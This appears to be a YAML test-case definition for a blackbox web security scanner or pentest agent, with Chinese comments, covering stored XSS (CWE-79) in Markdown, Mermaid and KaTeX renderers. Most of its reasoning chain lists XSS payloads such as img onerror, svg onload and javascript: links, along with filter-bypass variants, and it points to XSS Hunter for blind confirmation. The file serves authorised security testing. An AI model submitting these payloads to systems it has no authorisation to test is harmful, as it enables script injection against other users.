id: STORED_XSS
name: "存储型 XSS - 富文本渲染"
applicable: blackbox
category: input
cwe: CWE-79

trigger:
  - "应用支持 Markdown / Mermaid / 富文本输入"
  - "用户输入会被其他用户查看"

# 执行规则：以下每条必须逐一执行
reasoning_chain:
  - "问：渲染器类型？输入 ```mermaid 是否出图 / **bold** 是否加粗 / $x^2$ 是否出公式？"
  - "如果 Mermaid：提交 graph TD; A[\"<img src=x onerror=alert(1)>\"]，刷新后是否执行？"
  - "如果 Markdown：提交 [x](javascript:alert(1))，点击后是否执行？"
  - "如果 KaTeX：提交 $$\\href{javascript:alert(1)}{click}$$，是否执行？"
  - "通用：提交 <img src=x onerror=alert(1)>，是否执行？"
  - "通用：提交 <svg onload=alert(1)>，是否执行？"
  - "如果被转义：问：换 <svg/onload=alert(1)> 或事件处理器变体能否绕过？"
  - "问：是盲打场景（无法直接看回显）？用 XSS Hunter 外带 payload 确认"
